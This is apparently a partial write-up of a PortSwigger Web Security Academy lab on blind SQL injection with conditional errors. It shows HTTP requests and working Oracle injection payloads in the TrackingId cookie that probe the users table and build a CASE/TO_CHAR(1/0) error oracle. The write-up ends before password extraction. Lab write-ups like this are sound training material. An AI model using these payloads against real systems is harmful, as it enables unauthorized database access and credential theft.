### Blind SQL injection with conditional errors

### Beside the trackingid after putting a single quotaion , its giving 500 error so tried double quotes and got 200 .
**Request**
```http
GET / HTTP/2
Host: 0a630074031447fe80b7083600940066.web-security-academy.net
Cookie: TrackingId=U0rDw0vpucrCmpO9''; session=[REDACTED]
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://portswigger.net/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: cross-site
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
```

**Response**
```html
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 11449

<!DOCTYPE html>
<html>
<!--LAB_HEAD_START-->
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labsEcommerce.css rel=stylesheet>
        <title>Blind SQL injection with conditional errors</title>
    </head>
    [...remaining are omitted...]
```
---

### Then saw its using oracle database by using dual and got 200 status code .
```http
Cookie: TrackingId=U0rDw0vpucrCmpO9'||(SELECT '' FROM dual)||';
```

### The lab told to use users table , so when I used `'||(SELECT '' FROM users||'` , I got a 500 error this means I need to give some more parameter to actually check for a single row. So I used the username to see what comes and got 200 code .
```http
Cookie: TrackingId=U0rDw0vpucrCmpO9'||(SELECT '' FROM users WHERE username='administrator')||';
```

### Noe I used the CASE where i can insert any query like length of password ,substring and check the response code . Here I used 1=1 which is True , and if it's true it will return `''`(i.e. null) and if it's false it will directly throw 500 error .
```http
Cookie: TrackingId=U0rDw0vpucrCmpO9'||(SELECT CASE WHEN (1=1) THEN '' ELSE TO_CHAR(1/0) END FROM dual)||';
```















